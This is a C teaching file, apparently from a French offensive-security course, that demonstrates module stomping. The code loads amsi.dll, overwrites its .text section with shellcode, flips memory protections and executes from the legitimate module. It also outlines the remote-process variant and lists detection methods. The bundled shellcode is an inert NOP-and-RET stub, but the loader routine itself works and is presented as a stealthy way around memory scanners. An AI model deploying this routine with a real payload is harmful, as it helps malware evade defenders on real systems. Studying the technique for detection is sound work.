/*
 * OBJECTIF  : Comprendre le Module Stomping (ecrasement de DLL legitime)
 * PREREQUIS : Module 01-DLL-Injection, format PE, VirtualProtect
 * COMPILE   : cl example.c /Fe:example.exe
 *
 * Le Module Stomping consiste a charger une DLL legitime dans un processus,
 * puis a ecraser son contenu (.text section) avec du shellcode.
 * Le code malveillant s'execute depuis une region memoire associee a une DLL
 * legitime, ce qui est beaucoup moins suspect qu'une allocation RWX anonyme.
 */

#include <windows.h>
#include <stdio.h>

/* Shellcode inoffensif : NOP sled + RET */
unsigned char demo_shellcode[] = {
    0x90, 0x90, 0x90, 0x90, /* NOP NOP NOP NOP */
    0xC3                    /* RET */
};

/* Demo : Module Stomping dans notre propre processus */
void demo_module_stomping(void) {
    printf("[1] Module Stomping - Demo dans le processus courant\n\n");

    /* Etape 1 : Charger une DLL legitime peu utilisee */
    const char* target_dll = "amsi.dll";
    printf("    [Etape 1] Chargement de la DLL cible : %s\n", target_dll);

    HMODULE hDll = LoadLibraryA(target_dll);
    if (!hDll) {
        /* Fallback sur une autre DLL si amsi.dll n'est pas dispo */
        target_dll = "version.dll";
        hDll = LoadLibraryA(target_dll);
    }
    if (!hDll) {
        printf("    [-] LoadLibrary echoue\n");
        return;
    }
    printf("    [+] %s chargee a : %p\n", target_dll, hDll);

    /* Etape 2 : Trouver la section .text de la DLL */
    printf("\n    [Etape 2] Localisation de la section .text\n");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hDll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hDll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    BYTE* text_addr = NULL;
    DWORD text_size = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        char name[9] = {0};
        memcpy(name, sec[i].Name, 8);

        if (strcmp(name, ".text") == 0) {
            text_addr = (BYTE*)hDll + sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            printf("    [+] .text trouvee : %p (taille: 0x%lX)\n", text_addr, text_size);
            break;
        }
    }

    if (!text_addr) {
        printf("    [-] Section .text non trouvee\n");
        FreeLibrary(hDll);
        return;
    }

    /* Etape 3 : Changer la protection en RW pour ecrire */
    printf("\n    [Etape 3] Changement de protection memoire\n");
    DWORD old_protect;
    if (!VirtualProtect(text_addr, text_size, PAGE_READWRITE, &old_protect)) {
        printf("    [-] VirtualProtect echoue (err %lu)\n", GetLastError());
        FreeLibrary(hDll);
        return;
    }
    printf("    [+] Protection changee : 0x%lX -> PAGE_READWRITE\n", old_protect);

    /* Etape 4 : Ecraser le debut de .text avec le shellcode */
    printf("\n    [Etape 4] Ecrasement de .text avec le shellcode\n");

    /* Sauvegarder les premiers octets (pour la demo) */
    printf("    Avant : ");
    for (int i = 0; i < 8; i++) printf("%02X ", text_addr[i]);
    printf("\n");

    memcpy(text_addr, demo_shellcode, sizeof(demo_shellcode));

    printf("    Apres : ");
    for (int i = 0; i < 8; i++) printf("%02X ", text_addr[i]);
    printf("\n");

    /* Etape 5 : Changer en RX (executable) */
    printf("\n    [Etape 5] Protection finale : PAGE_EXECUTE_READ\n");
    VirtualProtect(text_addr, text_size, PAGE_EXECUTE_READ, &old_protect);

    /* Etape 6 : Executer le shellcode (NOP+RET = inoffensif) */
    printf("\n    [Etape 6] Execution du shellcode depuis .text de %s\n", target_dll);
    typedef void (*func_t)(void);
    func_t f = (func_t)text_addr;
    f();
    printf("    [+] Shellcode execute avec succes!\n");

    printf("\n    [*] Pour un scanner memoire, le code s'execute depuis %s\n", target_dll);
    printf("    [*] et non depuis une allocation VirtualAlloc suspecte.\n");
    printf("    [*] C'est beaucoup plus furtif!\n\n");

    FreeLibrary(hDll);
}

/* Explication de la technique sur un processus distant */
void explain_remote_stomping(void) {
    printf("[2] Module Stomping distant (concept)\n\n");

    printf("    Pour un processus distant :\n");
    printf("    1. OpenProcess(pid)\n");
    printf("    2. Forcer le chargement d'une DLL dans la cible :\n");
    printf("       CreateRemoteThread + LoadLibrary (classique)\n");
    printf("    3. Localiser la .text de la DLL dans le processus distant\n");
    printf("    4. WriteProcessMemory(remote_text, shellcode)\n");
    printf("    5. Creer un thread pointant vers l'adresse .text\n\n");

    printf("    Avantages vs injection classique :\n");
    printf("    - La memoire est associee a une DLL legitimate (MEM_IMAGE)\n");
    printf("    - Pas d'allocation VirtualAllocEx suspecte\n");
    printf("    - La region a une protection RX (pas RWX)\n");
    printf("    - L'adresse d'execution est dans un module signe\n\n");

    printf("    Detection :\n");
    printf("    - Comparaison .text en memoire vs .text sur disque\n");
    printf("    - Heuristique : .text modifiee apres chargement\n");
    printf("    - ETW : WriteProcessMemory dans une section IMAGE\n\n");
}

int main(void) {
    printf("[*] Demo : Module Stomping\n");
    printf("[*] ==========================================\n\n");

    demo_module_stomping();
    explain_remote_stomping();

    printf("[+] Exemple termine avec succes\n");
    return 0;
}
